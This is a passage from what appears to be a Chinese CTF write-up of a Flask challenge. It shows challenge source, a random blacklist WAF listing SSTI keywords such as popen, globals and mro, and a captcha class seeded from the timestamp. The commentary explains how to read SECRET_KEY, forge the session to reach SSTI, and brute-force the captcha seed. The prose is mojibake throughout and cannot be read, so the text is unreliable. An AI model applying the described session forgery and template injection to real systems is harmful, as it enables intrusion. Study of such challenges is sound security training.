string">'vip'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'no way~~~'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>                session<span class="token punctuation">[</span><span class="token string">'story'</span><span class="token punctuation">]</span> <span class="token operator">=</span> story        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'success'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'status'</span><span class="token punctuation">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'Please become a VIP first.'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¹¶ä¸”<code>/write</code>è¿™é‡Œè°ƒç”¨çš„ç«Ÿç„¶æ˜¯éšæœº<code>waf</code>ï¼Œè«åæ„Ÿè§‰æœ‰ç‚¹æç¬‘â€¦ç”²æ–¹çœ‹äº†ç›´è½æ³ªã€‚</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> randomrule <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'print'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'cookies'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'getattribute'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                   <span class="token comment" spellcheck="true"># rule 1</span>    <span class="token punctuation">[</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'print'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">'\"'</span><span class="token punctuation">,</span><span class="token string">'dict'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'set'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token comment" spellcheck="true"># rule 2</span>    <span class="token punctuation">[</span><span class="token string">'\''</span><span class="token punctuation">,</span><span class="token string">'\"'</span><span class="token punctuation">,</span><span class="token string">'dict'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'attr'</span><span class="token punctuation">,</span><span class="token string">'__'</span><span class="token punctuation">,</span><span class="token string">'list'</span><span class="token punctuation">,</span><span class="token string">'globals'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                           <span class="token comment" spellcheck="true"># rule 3</span>    <span class="token punctuation">[</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'popen'</span><span class="token punctuation">,</span><span class="token string">'dict'</span><span class="token punctuation">,</span><span class="token string">'doc'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'\{\{'</span><span class="token punctuation">,</span><span class="token string">'mro'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                          <span class="token comment" spellcheck="true"># rule 4</span>    <span class="token punctuation">[</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'cookies'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">,</span><span class="token string">'\{\{'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'attr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                          <span class="token comment" spellcheck="true"># rule 5</span>    <span class="token punctuation">[</span><span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'cookies'</span><span class="token punctuation">,</span><span class="token string">'values'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">]</span>                  <span class="token comment" spellcheck="true"># rule 6</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># Make waf more random</span><span class="token keyword">def</span> <span class="token function">transfrom</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span>    b <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">*</span> number <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span><span class="token keyword">def</span> <span class="token function">singel_waf</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> rules<span class="token punctuation">)</span><span class="token punctuation">:</span>    input <span class="token operator">=</span> input<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> rule <span class="token keyword">in</span> rules<span class="token punctuation">:</span>        <span class="token keyword">if</span> rule <span class="token keyword">in</span> input<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">minic_waf</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">:</span>    waf_seq <span class="token operator">=</span> random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> index <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>waf_seq<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        waf_seq<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> transfrom<span class="token punctuation">(</span>waf_seq<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> singel_waf<span class="token punctuation">(</span>input<span class="token punctuation">,</span> rule<span class="token punctuation">[</span>waf_seq<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œå…¶å®ä¸éœ€è¦å»ç»•è¿™ä¹ˆå¤šé»‘åå•ï¼Œåªè¦å»ç»•<code>config</code>å°±è¡Œï¼Œå› ä¸º<code>SECRET_KEY</code> åœ¨<code>config</code>é‡Œé¢ï¼Œç›´æ¥å»ä¼ªé€ <code>flask session</code>å°±å¯ä»¥<code>ssti</code> äº†ã€‚ä½†ç”±äºè¿™ä¸ªéšæœº<code>WAF</code>ï¼Œå®é™…ä¸Šä½ å¤šè¯·æ±‚å‡ æ¬¡ï¼Œç”šè‡³è¿<code>config</code>éƒ½ä¸ç”¨ç»•è¿‡ã€‚</p><h5 id="æˆä¸ºvipï¼ˆéªŒè¯ç ç”Ÿæˆé€»è¾‘é”™è¯¯ï¼‰"><a href="#æˆä¸ºvipï¼ˆéªŒè¯ç ç”Ÿæˆé€»è¾‘é”™è¯¯ï¼‰" class="headerlink" title="æˆä¸ºvipï¼ˆéªŒè¯ç ç”Ÿæˆé€»è¾‘é”™è¯¯ï¼‰"></a>æˆä¸ºvipï¼ˆéªŒè¯ç ç”Ÿæˆé€»è¾‘é”™è¯¯ï¼‰</h5><p>è¿™ä¸ªé¢˜çš„ä¸»è¦é—®é¢˜æ˜¯å¦‚ä½•æˆä¸º<code>vip</code>ã€‚</p><p>ä»”ç»†è§‚å¯Ÿç”ŸæˆéªŒè¯ç çš„é€»è¾‘ï¼Œé¦–å…ˆè®¿é—®<code>/captcha</code>ä¼šå®ä¾‹åŒ–<code>Captcha</code>ç±»ï¼Œéšåè°ƒç”¨äº†<code>generate()</code>æ–¹æ³•ç”Ÿæˆç¬¬ä¸€ä¸ªéªŒè¯ç ã€‚</p><p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„åœ°æ–¹å°±æ˜¯<code>random.seed</code>è®¾ç½®çš„ç§å­æ˜¯<code>(key or int(time.time())) + random.randint(1,100)</code>ï¼Œå³å½“å‰æ—¶é—´æˆ³åŠ ä¸Šä¸€ä¸ªéšæœºæ•°ï¼Œè¿™å°±å¾ˆå®¹æ˜“çˆ†ç ´äº†ï¼ˆåªè¦æœåŠ¡å™¨æ—¶é—´æ˜¯åŒæ­¥çš„ï¼‰</p><p>æˆ‘ä»¬çŸ¥é“<code>random</code>æ˜¯ä¼ªéšæœºçš„ï¼Œè¿™é‡Œè‡ªå·±å†™ä¸ªè„šæœ¬æµ‹è¯•ä¸€ä¸‹å°±çŸ¥é“ï¼Œè®¾ç½®ä¸ªå›ºå®šçš„ç§å­ï¼Œç„¶åè°ƒç”¨<code>generate_code</code>è‹¥å¹²æ¬¡ï¼Œè¿è¡Œå¤šæ¬¡è„šæœ¬ã€‚å°½ç®¡æ²¡å‘ç°å‘¨æœŸæ€§ï¼Œä½†ä½ ä¼šå‘ç°æ¯ä¸€æ¬¡è¿è¡Œè„šæœ¬ç”Ÿæˆçš„éšæœºæ•°ä¸€å®šæ˜¯ä¸€æ ·çš„ã€‚</p><pre class="line-numbers language-python"><code class="language-python">ColorTuple <span class="token operator">=</span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>int<span class="token punctuation">,</span> int<span class="token punctuation">,</span> int<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>int<span class="token punctuation">,</span> int<span class="token punctuation">,</span> int<span class="token punctuation">,</span> int<span class="token punctuation">]</span><span class="token punctuation">]</span>DATA_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">)</span>DEFAULT_FONTS <span class="token operator">=</span> <span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>DATA_DIR<span class="token punctuation">,</span> <span class="token string">'DroidSansMono.ttf'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">Captcha</span><span class="token punctuation">:</span>    lookup_table<span class="token punctuation">:</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>int<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>int<span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">1.97</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> width<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">160</span><span class="token punctuation">,</span> height<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">60</span><span class="token punctuation">,</span> key<span class="token punctuation">:</span> int <span class="token operator">=</span> None<span class="token punctuation">,</span> length<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span>                  fonts<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>str<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> None<span class="token punctuation">,</span> font_sizes<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>int<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_width <span class="token operator">=</span> width        self<span class="token punctuation">.</span>_height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>_length <span class="token operator">=</span> length        self<span class="token punctuation">.</span>_key <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">or</span> int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_fonts <span class="token operator">=</span> fonts <span class="token operator">or</span> DEFAULT_FONTS        self<span class="token punctuation">.</span>_font_sizes <span class="token operator">=</span> font_sizes <span class="token operator">or</span> <span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_truefonts<span class="token punctuation">:</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>FreeTypeFont<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_key<span class="token punctuation">)</span>    @property    <span class="token keyword">def</span> <span class="token function">truefonts</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>FreeTypeFont<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_truefonts<span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>_truefonts        self<span class="token punctuation">.</span>_truefonts <span class="token operator">=</span> <span class="token punctuation">[</span>            truetype<span class="token punctuation">(</span>n<span class="token punctuation">,</span> s<span class="token punctuation">)</span>            <span class="token keyword">for</span> n <span class="token keyword">in</span> self<span class="token punctuation">.</span>_fonts            <span class="token keyword">for</span> s <span class="token keyword">in</span> self<span class="token punctuation">.</span>_font_sizes        <span class="token punctuation">]</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_truefonts    @staticmethod    <span class="token keyword">def</span> <span class="token function">create_noise_curve</span><span class="token punctuation">(</span>image<span class="token punctuation">:</span> Image<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>        w<span class="token punctuation">,</span> h <span class="token operator">=</span> image<span class="token punctuation">.</span>size        x1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>w <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x2 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>w <span class="token operator">-</span> int<span class="token punctuation">(</span>w <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span>        y1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>int<span class="token punctuation">(</span>h <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> h <span class="token operator">-</span> int<span class="token punctuation">(</span>h <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        y2 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>y1<span class="token punctuation">,</span> h <span class="token operator">-</span> int<span class="token punctuation">(</span>h <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        points <span class="token operator">=</span> <span class="token punctuation">[</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y2<span class="token punctuation">]</span>        end <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span>        Draw<span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">.</span>arc<span class="token punctuation">(</span>points<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">)</span>        <span class="token keyword">return</span> image    @staticmethod    <span class="token keyword">def</span> <span class="token function">create_noise_dots</span><span class="token punctuation">(</span>image<span class="token punctuation">:</span> Image<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">,</span> width<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> number<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>        draw <span class="token operator">=</span> Draw<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        w<span class="token punctuation">,</span> h <span class="token operator">=</span> image<span class="token punctuation">.</span>size        <span class="token keyword">while</span> number<span class="token punctuation">:</span>            x1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span>            y1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span>            draw<span class="token punctuation">.</span>line<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">,</span> width<span class="token operator">=</span>width<span class="token punctuation">)</span>            number <span class="token operator">-=</span> <span class="token number">1</span>        <span class="token keyword">return</span> image    <span class="token keyword">def</span> <span class="token function">_draw_character</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> c<span class="token punctuation">:</span> str<span class="token punctuation">,</span> draw<span class="token punctuation">:</span> ImageDraw<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>        font <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>self<span class="token punctuation">.</span>truefonts<span class="token punctuation">)</span>        left<span class="token punctuation">,</span> top<span class="token punctuation">,</span> right<span class="token punctuation">,</span> bottom <span class="token operator">=</span> draw<span class="token punctuation">.</span>textbbox<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">)</span>        w <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1.7</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span>        h <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>bottom <span class="token operator">-</span> top<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1.7</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span>        dx1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>        dy1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>        im <span class="token operator">=</span> createImage<span class="token punctuation">(</span><span class="token string">'RGBA'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>w <span class="token operator">+</span> dx1<span class="token punctuation">,</span> h <span class="token operator">+</span> dy1<span class="token punctuation">)</span><span class="token punctuation">)</span>        Draw<span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">(</span>dx1<span class="token punctuation">,</span> dy1<span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># rotate</span>        im <span class="token operator">=</span> im<span class="token punctuation">.</span>crop<span class="token punctuation">(</span>im<span class="token punctuation">.</span>getbbox<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        im <span class="token operator">=</span> im<span class="token punctuation">.</span>rotate<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> BILINEAR<span class="token punctuation">,</span> expand<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># warp</span>        dx2 <span class="token operator">=</span> w <span class="token operator">*</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">)</span>        dy2 <span class="token operator">=</span> h <span class="token operator">*</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">)</span>        x1 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dx2<span class="token punctuation">,</span> dx2<span class="token punctuation">)</span><span class="token punctuation">)</span>        y1 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dy2<span class="token punctuation">,</span> dy2<span class="token punctuation">)</span><span class="token punctuation">)</span>        x2 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dx2<span class="token punctuation">,</span> dx2<span class="token punctuation">)</span><span class="token punctuation">)</span>        y2 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dy2<span class="token punctuation">,</span> dy2<span class="token punctuation">)</span><span class="token punctuation">)</span>        w2 <span class="token operator">=</span> w <span class="token operator">+</span> abs<span class="token punctuation">(</span>x1<span class="token punctuation">)</span> <span class="token operator">+</span> abs<span class="token punctuation">(</span>x2<span class="token punctuation">)</span>        h2 <span class="token operator">=</span> h <span class="token operator">+</span> abs<span class="token punctuation">(</span>y1<span class="token punctuation">)</span> <span class="token operator">+</span> abs<span class="token punctuation">(</span>y2<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">(</span>            x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span>            <span class="token operator">-</span>x1<span class="token punctuation">,</span> h2 <span class="token operator">-</span> y2<span class="token punctuation">,</span>            w2 <span class="token operator">+</span> x2<span class="token punctuation">,</span> h2 <span class="token operator">+</span> y2<span class="token punctuation">,</span>            w2 <span class="token operator">-</span> x2<span class="token punctuation">,</span> <span class="token operator">-</span>y1<span class="token punctuation">,</span>        <span class="token punctuation">)</span>        im <span class="token operator">=</span> im<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span>w2<span class="token punctuation">,</span> h2<span class="token punctuation">)</span><span class="token punctuation">)</span>        im <span class="token operator">=</span> im<span class="token punctuation">.</span>transform<span class="token punctuation">(</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">,</span> QUAD<span class="token punctuation">,</span> data<span class="token punctuation">)</span>        <span class="token keyword">return</span> im    <span class="token keyword">def</span> <span class="token function">create_captcha_image</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> chars<span class="token punctuation">:</span> str<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">,</span> background<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>        image <span class="token operator">=</span> createImage<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_height<span class="token punctuation">)</span><span class="token punctuation">,</span> background<span class="token punctuation">)</span>        draw <span class="token operator">=</span> Draw<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        images<span class="token punctuation">:</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>Image<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> chars<span class="token punctuation">:</span>            <span class="token keyword">if</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0.5</span><span class="token punctuation">:</span>                images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_draw_character<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> draw<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">)</span>            images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_draw_character<span class="token punctuation">(</span>c<span class="token punctuation">,</span> draw<span class="token punctuation">,</span> color<span class="token 